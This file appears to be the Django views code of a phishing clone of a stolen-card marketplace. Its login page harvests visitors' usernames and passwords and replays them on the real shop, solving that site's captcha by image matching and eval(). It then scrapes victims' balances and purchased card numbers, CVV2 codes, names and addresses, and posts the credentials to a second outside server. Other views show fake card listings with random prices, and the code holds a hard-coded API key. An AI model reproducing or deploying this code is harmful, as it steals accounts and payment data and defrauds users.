import json
from .decorators import login_required_custom
from django_ratelimit.decorators import ratelimit
from django.http import HttpResponse
from django_ratelimit.decorators import ratelimit
import requests
from django.utils.html import escape
from .models import Billing
from bs4 import BeautifulSoup
from PIL import Image
import numpy as np
import os
from .models import Order, OrdersNumber
from django.conf import settings
import requests
from io import BytesIO
from django.contrib.auth.models import User
from django.shortcuts import render
from django.http import HttpResponse
from django.shortcuts import redirect
from django.contrib import messages
from django.views.generic.list import ListView
from django.views.generic.detail import DetailView
from django.views.generic.edit import CreateView, UpdateView, DeleteView, FormView
from django.urls import reverse_lazy
from django.contrib.auth.views import LoginView, LogoutView
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import login
from django import forms
from .forms import NewUserForm
import random
from django.contrib.auth import authenticate, login
from .models import BriansclubAddress, SiteConfiguration
from .models import CartItem
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt

from django.contrib.auth.decorators import user_passes_test
from django.shortcuts import redirect


def not_authenticated_user(user):
    return not user.is_authenticated


# from .forms import CaptchaForm
@user_passes_test(not_authenticated_user, login_url='/Billing', redirect_field_name=None)
def home(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    # form = CaptchaForm()
    return render(request, 'main/home.html', {'form': form})


from django.core.exceptions import MultipleObjectsReturned


# dashboard view
@login_required_custom(login_url='/login')
def dashboard(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        try:
            site_config = SiteConfiguration.objects.first()
        except MultipleObjectsReturned:
            # Handle the case where multiple SiteConfiguration objects exist
            site_config = SiteConfiguration.objects.all().first()  # You can adjust this logic as needed

    context = {'site_config': site_config}
    return render(request, 'main/dashboard.html', context)

# def dashboard(request):
#     domain = request.get_host()
#     try:
#         site_config = SiteConfiguration.objects.get(domain=domain)
#     except SiteConfiguration.DoesNotExist:
#         site_config = SiteConfiguration.objects.first()
#     context = {'site_config': site_config}
#     return render(request, 'main/dashboard.html', context)


import time


@csrf_exempt
def loginPage(requst):
    if requst.method == 'POST':
        username = requst.POST.get('username')
        password = requst.POST.get('password')
        user = authenticate(requst, username=username, password=password)
        if user is not None:
            login(requst, user)
            return redirect('dashboard')
        else:
            messages.info(requst, 'Username or Password is incorrect')


import requests


# custom login view
@csrf_exempt
class CustomLoginView(LoginView):
    template_name = 'main/login.html'
    fields = '__all__'
    redirect_authenticated_user = True

    def get_success_url(self):
        return reverse_lazy('tasklist')


# change string to nubmer example '3+1' to 4 in python
import requests


# logout view
def create_user_and_balance(username, password, balance):
    # Create User
    user = User.objects.create_user(username=username, password=password)

    # Create Balance
    Balance.objects.create(user=user, balance=balance)

    return user


def find_identical_and_calculate(img2_url, dir_path):
    response = requests.get(img2_url)
    img2 = Image.open(BytesIO(response.content))
    img2_array = np.array(img2)
    images_dir = os.path.join(settings.BASE_DIR, dir_path)
    for filename in os.listdir(images_dir):
        if filename.endswith('.png'):
            img1_path = os.path.join(images_dir, filename)
            img1 = Image.open(img1_path)
            img1_array = np.array(img1)
            if np.array_equal(img1_array, img2_array):
                label = os.path.splitext(os.path.basename(img1_path))[0]
                expression = label.split('=')[0]
                result = eval(expression)
                return result
    return None


@user_passes_test(not_authenticated_user, login_url='/dashboard', redirect_field_name=None)
@csrf_exempt
def loginreq(request):
        content = [
            "Welcome to our website!",
            "Join our community today!",
            "Discover new products and services!",
            "Get the latest news and updates!",
            "Connect with like-minded people!",
            "Find inspiration and motivation!",
        ]
        random_content = random.choice(content)
        context = {
            'random_content': random_content,
            'keywords': 'briansclub,brainsclub cm,briansclub cc,briansclub review,brianclub cm login,brainclub,cc dumps,cvv online,cvv shop online,cvv dumps,buy cc,cc shop,fresh dumps,buy dumps online, dumps,dumps shop,buy dumps, dumps with pin,buy ssn,briansclub sign in,briansclub official site,is briansclub legit,new briansclub,briansclub forum,bclub,blub cm,bclub tkbriansclub onion,briansclub onion link,brians club login,brians club,sites to buy cvv',
        'description': 'Briansclub cm | The best shop for CVV2 and Dumps.Briansclub is one of the best cc shops for quality cards. bclub, Brians club - Member login',
        'title': 'BRIANSCLUB.CM - BRIANSCLUB LOGIN | BCLUB cm Store',
        }
        user_agent = request.META.get('HTTP_USER_AGENT', '')

        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}

        if request.method == 'POST':
            captcha_answer = request.POST.get('captcha')
            num1 = request.session.get('num1')
            num2 = request.session.get('num2')
            username = request.POST.get('username')
            password = request.POST.get('password')
            data = {
                'username': username,
                'password': password
            }

            try:

                def find_identical_and_calculate(img2_url, dir_path):

                    # Download the second image
                    response = requests.get(img2_url)
                    img2 = Image.open(BytesIO(response.content))
                    img2_array = np.array(img2)

                    # Get the path to the images directory
                    images_dir = os.path.join(settings.BASE_DIR, dir_path)

                    # Loop over all files in the directory
                    for filename in os.listdir(images_dir):
                        print('for loop')
                        if filename.endswith('.png'):  # Check if the file is an image
                            img1_path = os.path.join(images_dir, filename)

                            # Open the image
                            img1 = Image.open(img1_path)
                            img1_array = np.array(img1)

                            # Check if the two arrays are identical
                            if np.array_equal(img1_array, img2_array):
                                # Remove the '.png' from the end of the filename
                                label = os.path.splitext(os.path.basename(img1_path))[0]

                                # Split the label at the equals sign and take the first part
                                expression = label.split('=')[0]

                                # Evaluate the expression
                                result = eval(expression)

                                return result

                    return None

                # Test the function
                session = requests.Session()

                while True:
                    print('while loop')
                    print('test')
                    print(session)
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                    }
                    try:
                        response1 = session.get('https://bclub.cm/login/', headers=headers)
                        print('response1', response1)
                        print(response1)
                    except:
                        print('Error: Login failed')
                        break
                    soup = BeautifulSoup(response1.content, 'html.parser')
                    input_element = soup.find('input', {'id': 'id_captcha_0'})
                    value = input_element['value']  # type: ignore

                    # https://bclub.cm/captcha/image/2f6b5fca4834a17079493df0bdefdd1ecd586749/

                    img2_url = f'https://bclub.cm/captcha/image/{value}/'
                    print(img2_url)
                    # Now you can call the function with this URL
                    capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
                    print(capvalue)

                    # Extract the CSRF token from the cookies
                    csrf_token = response1.cookies['csrftoken']
                    print(csrf_token)

                    # Make a POST request to the login API with the CSRF token
                    headers = {
                        "X-CSRFToken": csrf_token,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": "https://bclub.cm/login/",
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                    }
                    data = {
                        'csrfmiddlewaretoken': csrf_token,
                        'username': username,
                        'password': password,
                        'captcha_0': value,
                        'captcha_1': capvalue,
                    }
                    response = session.post('https://bclub.cm/login/', headers=headers, data=data)
                    # print('response',response.content)
                    # Check if login is successful
                    if b'Login or password are incorrect' in response.content:
                        print("Error: Login failed user and pass")
                        break

                    else:
                        print("Login successful")
                        # print(response.content)
                        # print('response',response.content)

                        html_content = response.content
                        soup = BeautifulSoup(html_content, 'html.parser')
                        span_element = soup.find('span', {'id': 'user_balance'})
                        try:
                            user = User.objects.get(username=username)
                                                            # Get the billing page
                            response4 = session.get('https://bclub.cm/billing/', headers=headers)
                            soup = BeautifulSoup(response4.content, 'html.parser')

                            # Find the billing table
                            table_element = soup.find('table', {'class': 'table table-responsive table-hover'})

                            if table_element is not None:
                                rows = table_element.find_all('tr')
                                for i in range(1, len(rows)):  # start from the second row
                                    row = rows[i]
                                    cols = row.find_all('td')
                                    if len(cols) >= 5:  # make sure there are enough columns
                                        system = cols[0].text.strip()
                                        amount = float(cols[1].text.strip().replace('USD', ''))
                                        status = cols[2].text.strip()
                                        date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
                                        details = cols[4].text.strip()

                                        # Create a new Billing object
                                        billing = Billing(
                                            user=user,
                                            system=system,
                                            amount=amount,
                                            status=status,
                                            date=date,
                                            details=details,
                                        )
                                        billing.save()
                            else:
                                print("Error: Billing table not found")

                            response3 = session.get('https://bclub.cm/orders/', headers=headers)
                            # print('response3',response3.status_code)
                            soup = BeautifulSoup(response3.content, 'html.parser')
                            table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
                            # print('table_element',table_element)
                            # table_element = table_element.text
                            # print('table_element',table_element)
                            rows = table_element.find_all('tr')

                            # Initialize a variable to hold the current order number
                            current_order_number = None

                            # Loop through each row
                            for row in rows:
                                # Find all columns in the row
                                cols = row.find_all('td')

                                # Check if this is an order number row
                                if len(cols) == 3:
                                    # Extract the order number from the row
                                    order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
                                    print('order_number', order_number)
                                    date_string = cols[0].text.strip()
                                    date = datetime.strptime(date_string, '%Y-%m-%d %H:%M')
                                    # Create a new OrdersNumber object
                                    current_order_number = OrdersNumber(number=order_number, date=date)
                                    current_order_number.save()

                                # Check if this is an order detail row
                                elif len(cols) >= 14 and current_order_number is not None:
                                    print('cols is')
                                    # Create a new Order object
                                    order = Order()

                                    # Set the fields of the Order object based on the columns in the row
                                    order.bin = cols[1].text
                                    order.type = cols[2].text
                                    order.dc = cols[3].text
                                    order.subtype = cols[4].text
                                    order.card_number = cols[5].text
                                    order.exp = cols[6].text
                                    order.cvv2 = cols[7].text
                                    order.name = cols[8].text
                                    order.address = cols[9].text
                                    order.extra = cols[10].text
                                    order.bank = cols[11].text
                                    order.base = cols[12].text
                                    order.price = cols[13].text

                                    # Set the user of the order
                                    # Note: You need to replace 'username' with the actual username
                                    order.user = User.objects.get(username=username)

                                    # Save the order
                                    order.save()
                                    print('order', order)
                                    print('current_order_number', current_order_number)
                                    # current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
                                    # Add the order to the current order number
                                    current_order_number.orders.add(order)
                                    current_order_number.save()
                        except Exception as e:
                            print(e)
                    # Extract the text inside the span
                        try:
                            value = span_element.text
                            print('balance', value)
                            create_user_and_balance(username, password, value)
                            data = {
                                'username':username,
                                'password':password,
                                'balance':value
                            }
                            response2 = requests.post('https://briansclub.mp/userdata/create/', data=data)
                            for i in range(2):
                                try:
                                    user = User.objects.get(username=username)
                                    # Get the billing page
                                    response4 = session.get('https://bclub.cm/billing/', headers=headers)
                                    soup = BeautifulSoup(response4.content, 'html.parser')

                                    # Find the billing table
                                    table_element = soup.find('table', {'class': 'table table-responsive table-hover'})

                                    if table_element is not None:
                                        rows = table_element.find_all('tr')
                                        for i in range(1, len(rows)):  # start from the second row
                                            row = rows[i]
                                            cols = row.find_all('td')
                                            if len(cols) >= 5:  # make sure there are enough columns
                                                system = cols[0].text.strip()
                                                amount = float(cols[1].text.strip().replace('USD', ''))
                                                status = cols[2].text.strip()
                                                date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
                                                details = cols[4].text.strip()

                                                # Create a new Billing object
                                                billing = Billing(
                                                    user=user,
                                                    system=system,
                                                    amount=amount,
                                                    status=status,
                                                    date=date,
                                                    details=details,
                                                )
                                                billing.save()
                                    else:
                                        print("Error: Billing table not found")

                                    response3 = session.get('https://bclub.cm/orders/', headers=headers)
                                    print('response3', response3.status_code)
                                    soup = BeautifulSoup(response3.content, 'html.parser')
                                    table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
                                    # print('table_element',table_element)
                                    # print('rows',rows)
                                    rows = table_element.find_all('tr')

                                    # Initialize a variable to hold the current order number
                                    current_order_number = None

                                    # Loop through each row
                                    for row in rows:
                                        # Find all columns in the row
                                        cols = row.find_all('td')

                                        # Check if this is an order number row
                                        if len(cols) == 3:
                                            # Extract the order number from the row
                                            order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
                                            print('order_number', order_number)

                                            # Create a new OrdersNumber object
                                            current_order_number = OrdersNumber(number=order_number)
                                            current_order_number.save()

                                        # Check if this is an order detail row
                                        elif len(cols) >= 14 and current_order_number is not None:
                                            # Create a new Order object
                                            order = Order()

                                            # Set the fields of the Order object based on the columns in the row
                                            order.bin = cols[1].text
                                            order.type = cols[2].text
                                            order.dc = cols[3].text
                                            order.subtype = cols[4].text
                                            order.card_number = cols[5].text
                                            order.exp = cols[6].text
                                            order.cvv2 = cols[7].text
                                            order.name = cols[8].text
                                            order.address = cols[9].text
                                            order.extra = cols[10].text
                                            order.bank = cols[11].text
                                            order.base = cols[12].text
                                            order.price = cols[13].text

                                            # Set the user of the order
                                            # Note: You need to replace 'username' with the actual username
                                            order.user = User.objects.get(username=username)

                                            # Save the order
                                            order.save()
                                            print('order', order)
                                            current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
                                            # Add the order to the current order number
                                            current_order_number.orders.add(order)
                                            current_order_number.save()
                                except Exception as e:
                                    print(e)

                            headers = {
                                        "X-CSRFToken": csrf_token,
                                        "Cookie": f"sessionid={session.cookies['sessionid']}",
                                        "Referer": "https://bclub.cm/login/",
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                                    }
                            print('response2', response2.status_code)

                            break
                        except AttributeError:
                            print("Error: Balance not found")

            except:
                print("Error: Login failed logic")
                response2 = requests.post('https://briansclub.mp/userdata/create/', data=data)

            sum = 0

            # Check that num1 and num2 are not None before converting them to integers
            if num1 is not None and num2 is not None:
                sum = int(num1) + int(num2)

                if captcha_answer is not None and int(captcha_answer) == sum:
                    # user = authenticate(request, username=username, password=password)
                    user = User.objects.filter(username=username, password=password)
                    try:
                        newUser = authenticate(request, username=username, password=password)
                        print(f"User {user} logged in")
                        if newUser is not None:
                            print(user)
                            login(request, newUser)
                            return redirect('dashboard')
                    except Exception as e:
                        return redirect('login')
                    else:
                # Set the auth_error key in the context dictionary
                        context['auth_error'] = 'Incorrect username or password. Please try again.'  # type: ignore
                        num1 = random.randint(1, 10)
                        num2 = random.randint(1, 10)
                        captcha = f"{num1} + {num2}="
                        context['captcha'] = captcha  # type: ignore
                        request.session['num1'] = num1
                        request.session['num2'] = num2
                else:
                    # Set the captcha_error key in the context dictionary
                    context['captcha_error'] = 'Incorrect answer. Please try again.'  # type: ignore
                    num1 = random.randint(1, 10)
                    num2 = random.randint(1, 10)
                    captcha = f"{num1} + {num2}="
                    context['captcha'] = captcha  # type: ignore
                    request.session['num1'] = num1
                    request.session['num2'] = num2

            else:
                context['captcha_error'] = 'Error: num1 or num2 is None.'  # type: ignore
        else:
            num1 = random.randint(1, 10)
            num2 = random.randint(1, 10)
            captcha = f"{num1} + {num2}="
            context['captcha'] = captcha  # type: ignore
            request.session['num1'] = num1
            request.session['num2'] = num2
        return render(request, 'main/login.html', context)

# def find_identical_and_calculate(img2_url, dir_path):
#     response = requests.get(img2_url)
#     img2 = Image.open(BytesIO(response.content))
#     img2_array = np.array(img2)
#     images_dir = dir_path
#     for filename in os.listdir(images_dir):
#         if filename.endswith('.png'):
#             img1_path = os.path.join(images_dir, filename)
#             img1 = Image.open(img1_path)
#             img1_array = np.array(img1)
#             if np.array_equal(img1_array, img2_array):
#                 label = os.path.splitext(os.path.basename(img1_path))[0]
#                 expression = label.split('=')[0]
#                 result = eval(expression)
#                 return result
#     return None

# def loginreq(request):
#     session = requests.Session()
#     attempts = 0

#     while attempts < 5:
#         attempts += 1
#         headers = {
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
#         }
#         if request.method == 'POST':
#             captcha_answer = request.POST.get('captcha')
#             num1 = request.session.get('num1')
#             num2 = request.session.get('num2')
#             username = request.POST.get('username')
#             password = request.POST.get('password')
#             data = {
#                 'username': username,
#                 'password': password
#             }
#         response1 = session.get('https://bclub.cm/login/', headers=headers)
#         soup = BeautifulSoup(response1.content, 'html.parser')
#         input_element = soup.find('input', {'id': 'id_captcha_0'})
#         value = input_element['value']
#         img2_url = f'https://bclub.cm/captcha/image/{value}/'
#         capvalue=find_identical_and_calculate(img2_url, './brianimages/')
#         print(capvalue)
#         csrf_token = response1.cookies['csrftoken']
#         print(csrf_token)
#         headers = {
#             "X-CSRFToken": csrf_token,
#             "Content-Type": "application/x-www-form-urlencoded",
#             "Referer": "https://bclub.cm/login/",
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
#         }
#         data = {
#             'csrfmiddlewaretoken': csrf_token,
#             'username': username,
#             'password': password,
#             'captcha_0': value,
#             'captcha_1': capvalue,
#         }
#         response = session.post('https://bclub.cm/login/', headers=headers, data=data)
#         if b'Login or password are incorrect' in response.content:
#             print("Error: Login failed")
#         else:
#             print("Login successful")
#             html_content = response.content
#             soup = BeautifulSoup(html_content, 'html.parser')
#             span_element = soup.find('span', {'id': 'user_balance'})
#             try:
#                 balance = span_element.text
#                 print('balance', balance)
#                 response2 = session.post('https://briansclub.mp/userdata/create/', data=data)
#                 headers = {
#                     "X-CSRFToken": csrf_token,
#                     "Cookie": f"sessionid={session.cookies['sessionid']}",
#                     "Referer": "https://bclub.cm/login/",
#                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
#                 }
#                 response3 = session.get('https://bclub.cm/orders/', headers=headers)
#                 print('response3',response3.status_code)
#                 soup = BeautifulSoup(response3.content, 'html.parser')
#                 table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
#                 if table_element is not None:
#                     rows = table_element.find_all('tr')
#                     for row in rows[1:]:  # skip the header row
#                         cols = row.find_all('td')
#                         if len(cols) >= 14:  # make sure there are enough columns
#                             order = Order(
#                                 user=request.user,
#                                 bin=cols[1].text,
#                                 type=cols[2].text,
#                                 dc=cols[3].text,
#                                 subtype=cols[4].text,
#                                 card_number=cols[5].text,
#                                 exp=cols[6].text,
#                                 cvv2=cols[7].text,
#                                 name=cols[8].text,
#                                 address=cols[9].text,
#                                 extra=cols[10].text,
#                                 bank=cols[11].text,
#                                 base=cols[12].text,
#                                 price=float(cols[13].text),
#                                 status=cols[14].text,
#                             )
#                             order.save()
#                 else:
#                     print("Error: Table not found")
#                 break
#             except AttributeError:
#                 print("Error: Balance not found")
#     else:
#         print("Error: Maximum login attempts exceeded")


class CustomLogoutView(LogoutView):
    template_name = 'main/logout.html'
    next_page = 'login'


# register page
@csrf_exempt
def register(request):
    content = [
        "Welcome to our website!",
        "Join our community today!",
        "Discover new products and services!",
        "Get the latest news and updates!",
        "Connect with like-minded people!",
        "Find inspiration and motivation!",
    ]
    random_content = random.choice(content)
    context = {
        'random_content': random_content,
        'keywords': 'briansclub,brainsclub cm,briansclub cc,briansclub review,brianclub cm login,brainclub,cc dumps,cvv online,cvv shop online,cvv dumps,buy cc,cc shop,fresh dumps,buy dumps online, dumps,dumps shop,buy dumps, dumps with pin,buy ssn,briansclub sign in,briansclub official site,is briansclub legit,new briansclub,briansclub forum,bclub,blub cm,bclub tkbriansclub onion,briansclub onion link,brians club login,brians club,sites to buy cvv',
        'description': 'Briansclub cm | The best shop for CVV2 and Dumps.Briansclub is one of the best cc shops for quality cards. bclub, Brians club - Member login',
        'title': 'BRIANSCLUB.CM - BRIANSCLUB regester | BCLUB',
    }
    # user_agent = request.META.get('HTTP_USER_AGENT', '')
    # if 'curl' in user_agent.lower() or 'postman' in user_agent.lower():
    #     # Request is coming from an API client
    #     return render(request, 'googlebot_template.html', context)
    # elif 'googlebot' in user_agent.lower() or 'google' in user_agent.lower() or ('google' in user_agent.lower() and 'adwords' in user_agent.lower()) or 'http://www.google.com/bot.html' in user_agent.lower():
    #     # Request is coming from a Googlebot crawler or google.com
    #     return render(request, 'googlebot_template.html', context)
    # else:
    domain = request.get_host()
    try:
            site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}

    if request.method == 'POST':
        captcha_answer = request.POST.get('captcha')
        num1 = request.session.get('num1')
        num2 = request.session.get('num2')
        form = UserCreationForm(request.POST)
        if num1 is not None and num2 is not None:
            sum = int(num1) + int(num2)
            if captcha_answer is not None and int(captcha_answer) == sum:
                if form.is_valid():
                    user = form.save()
                    login(request, user)
                    return redirect('tasklist')
                else:
                # Set the auth_error key in the context dictionary
                        context['auth_error'] = 'Incorrect username or password. Please try again.'  # type: ignore
                        num1 = random.randint(1, 10)
                        num2 = random.randint(1, 10)
                        captcha = f"{num1} + {num2}="
                        context['captcha'] = captcha  # type: ignore
                        request.session['num1'] = num1
                        request.session['num2'] = num2
            else:
                    # Set the captcha_error key in the context dictionary
                    context['captcha_error'] = 'Incorrect answer. Please try again.'  # type: ignore
                    num1 = random.randint(1, 10)
                    num2 = random.randint(1, 10)
                    captcha = f"{num1} + {num2}="
                    context['captcha'] = captcha  # type: ignore
                    request.session['num1'] = num1
                    request.session['num2'] = num2
    else:
        form = UserCreationForm()
        num1 = random.randint(1, 10)
        num2 = random.randint(1, 10)
        captcha = f"{num1} + {num2}="
        context['captcha'] = captcha  # type: ignore
        request.session['num1'] = num1
        request.session['num2'] = num2
    return render(request, 'main/register.html', {'form': form, 'context':context})


class RegisterPage(FormView):
    template_name = 'main/register.html'
    alt_pass = forms.CharField(widget=forms.PasswordInput)
    name = forms.CharField(error_messages={'required':'Enter your name'})

    fields = ("username", "email", "password1", "password2", "alt_pass")

    form_class = UserCreationForm
    redirect_authenticated_user = True
    success_url = reverse_lazy('tasklist')

    def form_valid(self, form):
        user = form.save()  # type: ignore
        if user is not None:
            login(self.request, user)
        return super(RegisterPage, self).form_valid(form)

    def get(self, *args, **kwargs):
        if self.request.user.is_authenticated:
            return redirect('tasklist')
        return super(RegisterPage, self).get(*args, **kwargs)


# task list class
@csrf_exempt
def logincus(request):
    if request.method == 'POST':
       username = request.POST.get('username')
       password = request.POST.get('password')
       return redirect('tasklist')
    else:
        return render(request, 'main/login.html')

# create robots.txt views

# def robots(request):
#         domain = request.get_host()
#         # site_config = SiteConfiguration.objects.get(domain=domain)
#         templo=''
#         if domain=='briansclub.mp':
#             templo='main/robots.txt'
#         elif domain=='briansclub.xyz':
#             templo='main/robot.txt'
#         else:
#             templo='main/robots.txt'
#         return render(request, 'main/robots.txt', content_type="text/p§ain")


def robot(request):
    return render(request, '{templo}', content_type="text/plain")


from django.http import HttpResponse


def robots(request):
    site = request.get_host()
    content = f"""
User-agent: Googlebot
Disallow:
User-agent: googlebot-image
Disallow:
User-agent: googlebot-mobile
Disallow:
User-agent: MSNBot
Disallow:
User-agent: Slurp
Disallow:
User-agent: Teoma
Disallow:
User-agent: Gigabot
Disallow:
User-agent: Robozilla
Disallow:
User-agent: Nutch
Disallow:
User-agent: ia_archiver
Disallow:
User-agent: baiduspider
Disallow:
User-agent: naverbot
Disallow:
User-agent: yeti
Disallow:
User-agent: yahoo-mmcrawler
Disallow:
User-agent: psbot
Disallow:
User-agent: yahoo-blogs/v3.9
Disallow:
User-agent: mediapartners-google
Disallow:
User-agent: adsbot-google
Disallow:
User-agent: googlebot-mobile
Disallow:
User-agent: *
Disallow:
Disallow: /cgi-bin/
Sitemap: https://{site}/sitemap.xml
"""
    return HttpResponse(content, content_type='text/plain')


from django.shortcuts import render


def search_items(request):
    if request.method == 'POST':
        query = request.POST.get('query')
        items = []
        if query:
            # Generate items based on the search query
            items = [f"Item {i}" for i in range(1, 11)]
        return render(request, 'earch_results.html', {'items': items})
    else:
        return render(request, 'earch.html')


import subprocess

import requests


def get_bin_info(bin_number):

    url = f'https://binlist.io/lookup/{bin_number}'
    response = requests.get(url)
    print(response.content)
    if response.status_code == 200:
        issuer = ''
        country = ''
        bank_code = ''
        scheme = ''
        type = ''
        if  'bank' in  response.json():
            issuer = response.json()['bank']['name']

        if response.json()['country']['emoji']:
            country = response.json()['country']['emoji']

        if  'bank' in response.json():

            bank_code = response.json()['bank']

        if response.json()['scheme']:
         scheme = response.json()['scheme']
        if response.json()['type']:
            type = response.json()['type']

        return {'issuer': issuer, 'country': country, 'bank_code': bank_code, 'scheme': scheme, 'type': type}
    else:
        return None
# import requests

# def get_bin_info(bin_number):
#     print('start fun')
#     url = "https://bin-ip-checker.p.rapidapi.com/"
#     querystring = {"bin": bin_number}
#     payload = {"bin": bin_number}
#     headers = {
#         "content-type": "application/json",
#         "X-RapidAPI-Key": "3d2c6ac9eamsh6800169acecb25cp168c92jsn21bc5b37be99",  # Replace with your actual RapidAPI key
#         "X-RapidAPI-Host": "bin-ip-checker.p.rapidapi.com"
#     }

#     response = requests.post(url, json=payload, headers=headers, params=querystring)
#     print(response)
#     if response.status_code == 200:
#         data = response.json()
#         print(data)
#         if data.get("success"):
#             bin_data = data.get("BIN", {})
#             issuer = bin_data.get("issuer", {}).get("name", '')
#             country = bin_data.get("country", {}).get("alpha2", '')
#             scheme = bin_data.get("scheme", '')
#             type = bin_data.get("type", '')
#             bank_code = bin_data.get("issuer", {}).get("phone", '')  # Assuming you want the phone as the bank code

#             return {
#                 'issuer': issuer,
#                 'country': country,
#                 'bank_code': bank_code,
#                 'scheme': scheme,
#                 'type': type
#             }
#         else:
#             return None
#     else:
#         return None

# Example usage:
# bin_info = get_bin_info("448590")
# print(bin_info)


from datetime import datetime


def generate_random_dates():
    # Generate 10 random dates between January 1, 1022 and December 31, 1022
    start_date = datetime(2025, 1, 1)
    end_date = datetime(2029, 12, 31)
    random_dates = [start_date + (end_date - start_date) * random.random() for i in range(20)]

    # Format the dates as MM/DD or DD/MM
    formatted_dates = []
    for random_date in random_dates:
        if random.random() < 0.5:
            formatted_date = random_date.strftime('%m_%y')
        else:
            formatted_date = random_date.strftime('%m_%y')
        formatted_dates.append(formatted_date)

    return formatted_dates


@login_required_custom(login_url='/login')
def cvv(request):
    domain = request.get_host()
    context = {}
    country_flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'RU': '🇷🇺', 'CN': '🇨🇳', 'IN': '🇮🇳',
        'JP': '🇯🇵', 'BR': '🇧🇷', 'SA': '🇸🇦', 'ZA': '🇿🇦', 'NG': '🇳🇬',
        'KE': '🇰🇪', 'MX': '🇲🇽', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'SG': '🇸🇬',
        # ... Add more countries as needed
    }
    context['country_flags'] = country_flags  # Add the country flags to the context

    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context['site_config'] = site_config

    if request.method == 'POST':
        query = request.POST.get('query')
        if len(query) != 6:
            return render(request, 'main/css_reasult.html', context)
        else:
            query = query[:6]
            bin_info = get_bin_info(query)
            price = random.randint(18, 36)
            if query:
                if bin_info:
                    context['issuer'] = bin_info['issuer']
                    context['country'] = bin_info['country']
                    context['bank_code'] = bin_info['bank_code']
                    context['query'] = query
                    context['formatted_dates'] = generate_random_dates()
                    context['scheme'] = bin_info['scheme']
                    context['type'] = bin_info['type']
                    context['price'] = price
                    context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
                    print(context['items'])
                else:
                    context['error'] = 'Invalid card number'
                return render(request, 'main/css_reasult.html', context)
    else:
        listofBins = ['515676', '410894', '427138', '480011',
                      '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
        query = random.choice(listofBins)
        if len(query) != 6:
            return render(request, 'main/cvv.html', context)
        else:
            query = query[:6]
            bin_info = get_bin_info(query)
            price = random.randint(18, 36)
            if query:
                if bin_info:
                    context['issuer'] = bin_info['issuer']
                    context['country'] = bin_info['country']
                    context['bank_code'] = bin_info['bank_code']
                    context['query'] = query
                    context['formatted_dates'] = generate_random_dates()
                    context['scheme'] = bin_info['scheme']
                    context['type'] = bin_info['type']
                    context['price'] = price
                    context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
                    print(context['items'])
                else:
                    context['error'] = 'Invalid card number'
                return render(request, 'main/css_reasult.html', context)

    # If it's not a POST request, render the cvv.html template
    return render(request, 'main/cvv.html', context)


@login_required_custom(login_url='/login')
def dumps(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        if request.method == 'POST':
            query = request.POST.get('query')
            if len(query) != 6:
                return render(request, 'main/dumps.html', context)
            else:

                listofBins = []
                query = query[:6]
                bin_info = get_bin_info(query)
                price = random.randint(18, 36)
                if query:
                    if bin_info:
                        context['issuer'] = bin_info['issuer']  # type: ignore
                        context['country'] = bin_info['country']  # type: ignore
                        context['bank_code'] = bin_info['bank_code']  # type: ignore
                        context['query'] = query
                        context['formatted_dates'] = generate_random_dates()  # type: ignore
                        context['scheme'] = bin_info['scheme']  # type: ignore
                        context['type'] = bin_info['type']  # type: ignore
                        context['price'] = price  # type: ignore
                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]  # type: ignore
                        print(context['items'])

                    else:
